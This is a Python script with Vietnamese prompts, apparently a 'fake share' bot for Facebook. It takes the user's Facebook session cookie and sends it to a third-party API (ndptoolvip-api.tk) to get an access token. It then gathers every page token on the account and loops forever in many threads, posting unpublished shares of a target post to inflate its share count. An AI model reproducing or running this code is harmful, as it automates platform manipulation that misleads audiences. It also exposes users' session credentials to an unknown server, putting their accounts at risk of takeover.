import requests, random, threading, os
#==Màu==#
do = "\033[1;91m"
xanhbien = "\033[1;36m"
vang = "\033[0;33m"
hong = "\033[1;35m"
xanhduong = "\033[1;34m"
xanhla = "\033[1;32m"
xanh="\033[1;32m"
cam="\033[1;33m"
blue="\033[1;34m"
lam="\033[1;34m"
tim="\033[1;34m"
syan="\033[1;36m"
xnhac= "\033[1;96m"
den="\033[1;90m"
luc="\033[1;92m"
xduong="\033[1;94m"
trang="\033[1;97m"

list_token = []
# =========================== [ CLASS + FUNCTION TOOL ] ===========================
def banner():
    # Nhận Code Tool Theo Yêu Cầu (Trong Khả Năng) 
    # Zalo: 0399781029 - LÊ TRỌNG TRUYỀN
  
    os.system("cls" if os.name == "nt" else "clear")
    os.system('title TOOL SHARE ẢO MAX SPEED - NGUYENDUCPHAT207')
    banner = ''' 
\033[1;32m                  SHARE ẢO ĐA LUỒNG MAX SPEED
\033[1;39m   ────────────────────────────────────────────────────────────
\033[1;32m   NGUYỄN MINH HOÀNG                                  PHAN HƯNG
\033[1;39m   ────────────────────────────────────────────────────────────
    '''
    print(banner)
class NguyenDucPhatCuteVcl:
    def gettoken(self, cookie):

        json_info = requests.get('https://ndptoolvip-api.tk/api/gettokeneaabw.php?cookie='+cookie).json()
        if json_info['status'] == 'success':
            return json_info
        else:
            return False
    def getpage(self, token):

        try:
            json_get = requests.get('https://graph.facebook.com/me/accounts?access_token='+token).json()['data']
            if len(json_get) != 0:
                return json_get
            else: 
                return False
        except:
            return False
    def run_share(self, tokenpage, id_post):

      
        rq_url = random.choice([requests.get, requests.post])
        sharepost = rq_url(f'https://graph.facebook.com/me/feed?method=POST&link=https://m.facebook.com/{id_post}&published=0&access_token={tokenpage}').json()
        if 'id' in sharepost:
            idshare = sharepost['id']
            print(f' UID SHARE: {idshare}] | THÀNH CÔNG ')
        else:
            print(' ERROR')
# vào tool 
banner()
while True:
    cookie = input('VUI LÒNG NHẬP COOKIE FACEBOOK CHỨA PAGE: ')
    dpcute = NguyenDucPhatCuteVcl()
    checklive = dpcute.gettoken(cookie)
    if checklive != False:
        token = checklive['access_token']
        name  = checklive['name']
        uid   = checklive['id']
        print('─'*50)
        print(f'NAME FB: {name} | UID FB: {uid}')
        print('─'*50)
        break
    else:
        print('Cookie Die Or Out Vui Lòng Nhập Lại!!')
        continue
id_post = input(vang+'LINK POST là nhập uid chứ đừng nhập nguyên cái link lên tds mà lấy id: ')
print('─'*50)
luong = int(input('VUI LÒNG NHẬP SỐ LUỒNG SHARE nick có bao nhiêu page thì nhập bấy nhiêu: '))
print('─'*50)
getpage = dpcute.getpage(token)
if getpage != False:
    print(vang+f'Đã Tìm Thấy | {len(getpage)} | Page', end='\r')
    for getdl in getpage:
        tokenpagegett = getdl['access_token']
        list_token.append(tokenpagegett)
else:
    print('Không Tìm Thấy Page Nào!!')
while True:
    for tokenpage in list_token:
        t = threading.Thread(target=dpcute.run_share,args=(tokenpage, id_post))
        t.start()
        while threading.active_count() > luong:
            t.join()